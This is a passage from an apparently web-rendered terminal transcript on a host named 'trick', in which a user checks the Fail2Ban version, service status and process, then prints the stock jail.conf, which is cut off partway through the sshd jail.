class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br></pre></td><td class="code"><pre><code class="hljs routeros">michael@trick:/etc/fail2ban$ getent<span class="hljs-built_in"> group </span>| grep -i <span class="hljs-string">&quot;fail2ban&quot;</span><br>michael@trick:/etc/fail2ban$ fail2ban-client --version<br>Fail2Ban v0.10.2<br><br>Copyright (c) 2004-2008 Cyril Jaquier, 2008- Fail2Ban Contributors<br>Copyright of modifications held by their respective authors.<br>Licensed under the GNU General Public License v2 (GPL).<br>michael@trick:/etc/fail2ban$ systemctl status fail2ban<br>● fail2ban.service - Fail2Ban<span class="hljs-built_in"> Service</span><br><span class="hljs-built_in"></span>   Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled; vendor preset: enabled)<br>   Active: active (running) since Wed 2024-09-25 08:51:40 CEST; 35min ago<br>     Docs: man:fail2ban(1)<br>  Process: 3129 <span class="hljs-attribute">ExecStartPre</span>=/bin/mkdir -p /var/run/fail2ban (<span class="hljs-attribute">code</span>=exited, <span class="hljs-attribute">status</span>=0/SUCCESS)<br> Main PID: 3130 (fail2ban-server)<br>    Tasks: 3 (limit: 2315)<br>   Memory: 11.3M<br>   CGroup: /system.slice/fail2ban.service<br>           └─3130 /usr/bin/python3 /usr/bin/fail2ban-server -xf start<br>michael@trick:/etc/fail2ban$ ps -ef | grep -i <span class="hljs-string">&quot;fail2ban&quot;</span><br>root       3130      1  0 08:51 ?        00:00:00 /usr/bin/python3 /usr/bin/fail2ban-server -xf start<br>michael    3344   3091  0 09:26 pts/0    00:00:00 grep -i fail2ban<br>michael@trick:/etc/fail2ban$ cat /etc/fail2ban/jail.conf<br><span class="hljs-comment">#</span><br><span class="hljs-comment"># WARNING: heavily refactored in 0.9.0 release.  Please review and</span><br><span class="hljs-comment">#          customize settings for your setup.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Changes:  in most of the cases you should not modify this</span><br><span class="hljs-comment">#           file, but provide customizations in jail.local file,</span><br><span class="hljs-comment">#           or separate .conf files under jail.d/ directory, e.g.:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># HOW TO ACTIVATE JAILS:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># YOU SHOULD NOT MODIFY THIS FILE.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># It will probably be overwritten or improved in a distribution update.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Provide customizations in a jail.local file or a jail.d/customisation.local.</span><br><span class="hljs-comment"># For example to change the default bantime for all jails and to enable the</span><br><span class="hljs-comment"># ssh-iptables jail the following (uncommented) would appear in the .local file.</span><br><span class="hljs-comment"># See man 5 jail.conf for details.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># [DEFAULT]</span><br><span class="hljs-comment"># bantime = 1h</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># [sshd]</span><br><span class="hljs-comment"># enabled = true</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See jail.conf(5) man page for more information</span><br><br><br><br><span class="hljs-comment"># Comments: use &#x27;#&#x27; for comment lines and &#x27;;&#x27; (following a space) for inline comments</span><br><br><br>[INCLUDES]<br><br><span class="hljs-comment">#before = paths-distro.conf</span><br>before = paths-debian.conf<br><br><span class="hljs-comment"># The DEFAULT allows a global definition of the options. They can be overridden</span><br><span class="hljs-comment"># in each jail afterwards.</span><br><br>[DEFAULT]<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># MISCELLANEOUS OPTIONS</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># &quot;ignorself&quot; specifies whether the local resp. own IP addresses should be ignored</span><br><span class="hljs-comment"># (default is true). Fail2ban will not ban a host which matches such addresses.</span><br><span class="hljs-comment">#ignorself = true</span><br><br><span class="hljs-comment"># &quot;ignoreip&quot; can be a list of IP addresses, CIDR masks or DNS hosts. Fail2ban</span><br><span class="hljs-comment"># will not ban a host which matches an address in this list. Several addresses</span><br><span class="hljs-comment"># can be defined using space (and/or comma) separator.</span><br><span class="hljs-comment">#ignoreip = 127.0.0.1/8 ::1</span><br><br><span class="hljs-comment"># External command that will take an tagged arguments to ignore, e.g. &lt;ip&gt;,</span><br><span class="hljs-comment"># and return true if the IP is to be ignored. False otherwise.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ignorecommand = /path/to/command &lt;ip&gt;</span><br>ignorecommand =<br><br><span class="hljs-comment"># &quot;bantime&quot; is the number of seconds that a host is banned.</span><br>bantime  = 10s<br><br><span class="hljs-comment"># A host is banned if it has generated &quot;maxretry&quot; during the last &quot;findtime&quot;</span><br><span class="hljs-comment"># seconds.</span><br>findtime  = 10s<br><br><span class="hljs-comment"># &quot;maxretry&quot; is the number of failures before a host get banned.</span><br>maxretry = 5<br><br><span class="hljs-comment"># &quot;backend&quot; specifies the backend used to get files modification.</span><br><span class="hljs-comment"># Available options are &quot;pyinotify&quot;, &quot;gamin&quot;, &quot;polling&quot;, &quot;systemd&quot; and &quot;auto&quot;.</span><br><span class="hljs-comment"># This option can be overridden in each jail as well.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># pyinotify: requires pyinotify (a file alteration monitor) to be installed.</span><br><span class="hljs-comment">#              If pyinotify is not installed, Fail2ban will use auto.</span><br><span class="hljs-comment"># gamin:     requires Gamin (a file alteration monitor) to be installed.</span><br><span class="hljs-comment">#              If Gamin is not installed, Fail2ban will use auto.</span><br><span class="hljs-comment"># polling:   uses a polling algorithm which does not require external libraries.</span><br><span class="hljs-comment"># systemd:   uses systemd python library to access the systemd journal.</span><br><span class="hljs-comment">#              Specifying &quot;logpath&quot; is not valid for this backend.</span><br><span class="hljs-comment">#              See &quot;journalmatch&quot; in the jails associated filter config</span><br><span class="hljs-comment"># auto:      will try to use the following backends, in order:</span><br><span class="hljs-comment">#              pyinotify, gamin, polling.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">Note:</span> if systemd backend is chosen as the default but you enable a jail</span><br><span class="hljs-comment">#       for which logs are present only in its own log files, specify some other</span><br><span class="hljs-comment">#       backend for that jail (e.g. polling) and provide empty value for</span><br><span class="hljs-comment">#       journalmatch. See https://github.com/fail2ban/fail2ban/issues/959#issuecomment-74901200</span><br>backend = auto<br><br><span class="hljs-comment"># &quot;usedns&quot; specifies if jails should trust hostnames in logs,</span><br><span class="hljs-comment">#   warn when DNS lookups are performed, or ignore all hostnames in logs</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># yes:   if a hostname is encountered, a DNS lookup will be performed.</span><br><span class="hljs-comment"># warn:  if a hostname is encountered, a DNS lookup will be performed,</span><br><span class="hljs-comment">#        but it will be logged as a warning.</span><br><span class="hljs-comment"># no:    if a hostname is encountered, will not be used for banning,</span><br><span class="hljs-comment">#        but it will be logged as info.</span><br><span class="hljs-comment"># raw:   use raw value (no hostname), allow use it for no-host filters/actions (example user)</span><br>usedns = warn<br><br><span class="hljs-comment"># &quot;logencoding&quot; specifies the encoding of the log files handled by the jail</span><br><span class="hljs-comment">#   This is used to decode the lines from the log file.</span><br><span class="hljs-comment">#   Typical examples:  &quot;ascii&quot;, &quot;utf-8&quot;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   auto:   will use the system locale setting</span><br>logencoding = auto<br><br><span class="hljs-comment"># &quot;enabled&quot; enables the jails.</span><br><span class="hljs-comment">#  By default all jails are disabled, and it should stay this way.</span><br><span class="hljs-comment">#  Enable only relevant to your setup jails in your .local or jail.d/*.conf</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># true:  jail will be enabled and log files will get monitored for changes</span><br><span class="hljs-comment"># false: jail is not enabled</span><br>enabled = <span class="hljs-literal">false</span><br><br><br><span class="hljs-comment"># &quot;mode&quot; defines the mode of the filter (see corresponding filter implementation for more info).</span><br>mode = normal<br><br><span class="hljs-comment"># &quot;filter&quot; defines the filter to use by the jail.</span><br><span class="hljs-comment">#  By default jails have names matching their filter name</span><br><span class="hljs-comment">#</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">filter </span>= %(__name__)s[<span class="hljs-attribute">mode</span>=%(mode)s]<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ACTIONS</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># Some options used for actions</span><br><br><span class="hljs-comment"># Destination email address used solely for the interpolations in</span><br><span class="hljs-comment"># jail.&#123;conf,local,d/*&#125; configuration files.</span><br>destemail = root@localhost<br><br><span class="hljs-comment"># Sender email address used solely for some actions</span><br>sender = root@&lt;fq-hostname&gt;<br><br><span class="hljs-comment"># E-mail action. Since 0.8.1 Fail2Ban uses sendmail MTA for the</span><br><span class="hljs-comment"># mailing. Change mta configuration parameter to mail if you want to</span><br><span class="hljs-comment"># revert to conventional &#x27;mail&#x27;.</span><br>mta = sendmail<br><br><span class="hljs-comment"># Default protocol</span><br>protocol = tcp<br><br><span class="hljs-comment"># Specify chain where jumps would need to be added in ban-actions expecting parameter chain</span><br>chain = &lt;known/chain&gt;<br><br><span class="hljs-comment"># Ports to be banned</span><br><span class="hljs-comment"># Usually should be overridden in a particular jail</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>= 10000<br><br><span class="hljs-comment"># Format of user-agent https://tools.ietf.org/html/rfc7231#section-5.5.3</span><br>fail2ban_agent = Fail2Ban/%(fail2ban_version)s<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Action shortcuts. To be used to define action parameter</span><br><br><span class="hljs-comment"># Default banning action (e.g. iptables, iptables-new,</span><br><span class="hljs-comment"># iptables-multiport, shorewall, etc) It is used to define</span><br><span class="hljs-comment"># action_* variables. Can be overridden globally or per</span><br><span class="hljs-comment"># section within jail.local file</span><br>banaction = iptables-multiport<br>banaction_allports = iptables-allports<br><br><span class="hljs-comment"># The simplest action to take: ban only</span><br>action_ = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">bantime</span>=<span class="hljs-string">&quot;%(bantime)s&quot;</span>, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;%(protocol)s&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br><br><span class="hljs-comment"># ban &amp; send an e-mail with whois report to the destemail.</span><br>action_mw = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">bantime</span>=<span class="hljs-string">&quot;%(bantime)s&quot;</span>, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;%(protocol)s&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br>            %(mta)s-whois[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">sender</span>=<span class="hljs-string">&quot;%(sender)s&quot;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&quot;%(destemail)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;%(protocol)s&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br><br><span class="hljs-comment"># ban &amp; send an e-mail with whois report and relevant log lines</span><br><span class="hljs-comment"># to the destemail.</span><br>action_mwl = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">bantime</span>=<span class="hljs-string">&quot;%(bantime)s&quot;</span>, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;%(protocol)s&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br>             %(mta)s-whois-lines[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">sender</span>=<span class="hljs-string">&quot;%(sender)s&quot;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&quot;%(destemail)s&quot;</span>, <span class="hljs-attribute">logpath</span>=%(logpath)s, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br><br><span class="hljs-comment"># See the IMPORTANT note in action.d/xarf-login-attack for when to use this action</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># ban &amp; send a xarf e-mail to abuse contact of IP address and include relevant log lines</span><br><span class="hljs-comment"># to the destemail.</span><br>action_xarf = %(banaction)s[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">bantime</span>=<span class="hljs-string">&quot;%(bantime)s&quot;</span>, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>, <span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;%(protocol)s&quot;</span>, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br>             xarf-login-attack[<span class="hljs-attribute">service</span>=%(__name__)s, <span class="hljs-attribute">sender</span>=<span class="hljs-string">&quot;%(sender)s&quot;</span>, <span class="hljs-attribute">logpath</span>=%(logpath)s, <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;%(port)s&quot;</span>]<br><br><span class="hljs-comment"># ban IP on CloudFlare &amp; send an e-mail with whois report and relevant log lines</span><br><span class="hljs-comment"># to the destemail.</span><br>action_cf_mwl = cloudflare[<span class="hljs-attribute">cfuser</span>=<span class="hljs-string">&quot;%(cfemail)s&quot;</span>, <span class="hljs-attribute">cftoken</span>=<span class="hljs-string">&quot;%(cfapikey)s&quot;</span>]<br>                %(mta)s-whois-lines[<span class="hljs-attribute">name</span>=%(__name__)s, <span class="hljs-attribute">sender</span>=<span class="hljs-string">&quot;%(sender)s&quot;</span>, <span class="hljs-attribute">dest</span>=<span class="hljs-string">&quot;%(destemail)s&quot;</span>, <span class="hljs-attribute">logpath</span>=%(logpath)s, <span class="hljs-attribute">chain</span>=<span class="hljs-string">&quot;%(chain)s&quot;</span>]<br><br><span class="hljs-comment"># Report block via blocklist.de fail2ban reporting service API</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># See the IMPORTANT note in action.d/blocklist_de.conf for when to use this action.</span><br><span class="hljs-comment"># Specify expected parameters in file action.d/blocklist_de.local or if the interpolation</span><br><span class="hljs-comment"># `action_blocklist_de` used for the action, set value of `blocklist_de_apikey`</span><br><span class="hljs-comment"># in your `jail.local` globally (section [DEFAULT]) or per specific jail section (resp. in </span><br><span class="hljs-comment"># corresponding jail.d/my-jail.local file).</span><br><span class="hljs-comment">#</span><br>action_blocklist_de  = blocklist_de[<span class="hljs-attribute">email</span>=<span class="hljs-string">&quot;%(sender)s&quot;</span>, <span class="hljs-attribute">service</span>=%(filter)s, <span class="hljs-attribute">apikey</span>=<span class="hljs-string">&quot;%(blocklist_de_apikey)s&quot;</span>, <span class="hljs-attribute">agent</span>=<span class="hljs-string">&quot;%(fail2ban_agent)s&quot;</span>]<br><br><span class="hljs-comment"># Report ban via badips.com, and use as blacklist</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See BadIPsAction docstring in config/action.d/badips.py for</span><br><span class="hljs-comment"># documentation for this action.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> This action relies on banaction being present on start and therefore</span><br><span class="hljs-comment"># should be last action defined for a jail.</span><br><span class="hljs-comment">#</span><br>action_badips = badips.py[<span class="hljs-attribute">category</span>=<span class="hljs-string">&quot;%(__name__)s&quot;</span>, <span class="hljs-attribute">banaction</span>=<span class="hljs-string">&quot;%(banaction)s&quot;</span>, <span class="hljs-attribute">agent</span>=<span class="hljs-string">&quot;%(fail2ban_agent)s&quot;</span>]<br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Report ban via badips.com (uses action.d/badips.conf for reporting only)</span><br><span class="hljs-comment">#</span><br>action_badips_report = badips[<span class="hljs-attribute">category</span>=<span class="hljs-string">&quot;%(__name__)s&quot;</span>, <span class="hljs-attribute">agent</span>=<span class="hljs-string">&quot;%(fail2ban_agent)s&quot;</span>]<br><br><span class="hljs-comment"># Report ban via abuseipdb.com.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See action.d/abuseipdb.conf for usage example and details.</span><br><span class="hljs-comment">#</span><br>action_abuseipdb = abuseipdb<br><br><span class="hljs-comment"># Choose default action.  To change, just override value of &#x27;action&#x27; with the</span><br><span class="hljs-comment"># interpolation to the chosen action shortcut (e.g.  action_mw, action_mwl, etc) in jail.local</span><br><span class="hljs-comment"># globally (section [DEFAULT]) or per specific section</span><br>action = %(action_)s<br><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># JAILS</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SSH servers</span><br><span class="hljs-comment">#</span><br><br>[sshd]<br><br><span class="hljs-comment"># To use more aggressive sshd modes set filter parameter &quot;mode&quot; in jail.local:</span><br><span class="hljs-comment"># normal (default), ddos, extra or aggressive (combines all).</span><br><span class="hljs-comment"># See &quot;tests/files/logs/sshd&quot; or &quot;filter.d/sshd.conf&quot; for usage example and details.</span><br><span class="hljs-comment">#mode   = normal</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">port </span>   = ssh<br>logpath = 